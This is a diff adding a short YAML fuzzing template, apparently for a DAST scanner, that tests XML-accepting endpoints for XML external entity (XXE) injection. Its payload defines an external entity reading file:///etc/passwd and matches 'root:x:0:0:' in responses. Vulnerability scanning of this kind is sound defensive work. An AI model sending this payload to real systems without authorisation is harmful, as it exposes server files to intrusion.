@@ -1,0 +1,29 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{xxe}}'
+    mode: single
+    part: body
+    type: replace
+  matchers:
+  - part: body
+    type: word
+    words:
+    - 'root:x:0:0:'
+  payloads:
+    xxe:
+    - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY
+      ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+  pre-condition:
+  - condition: and
+    dsl:
+    - method in ["POST", "PUT", "DELETE", "PATCH"]
+    - contains(tolower(content_type), "xml")
+    type: dsl
+  stop-at-first-match: true
+id: xxe-body-uniq
+info:
+  author: reewardius
+  name: XXE
+  severity: high
+  tags: fuzzing-req,fuzzing-req-xxe,fuzzing-req-body-query,fuzzing-req-body,xxe,dast
